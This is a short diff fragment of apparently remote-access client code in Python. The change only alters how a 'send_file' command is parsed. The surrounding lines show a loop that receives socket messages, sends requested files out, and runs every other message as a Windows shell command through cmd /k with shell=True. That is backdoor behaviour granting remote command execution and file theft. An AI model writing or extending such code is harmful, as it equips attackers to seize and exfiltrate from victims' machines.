@@ -25,7 +25,7 @@ def receive_messages():
                 msg_length = int(msg_length)
                 msg = client.recv(msg_length).decode(FORMAT)
                 if "send_file" in msg:
-                    file_name = msg.split(" ")
+                    file_name = msg.split("|")
                     sender.send_file(file_name[1])
                 try:
                     cmd = subprocess.Popen('cmd /k "%s"'%msg,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
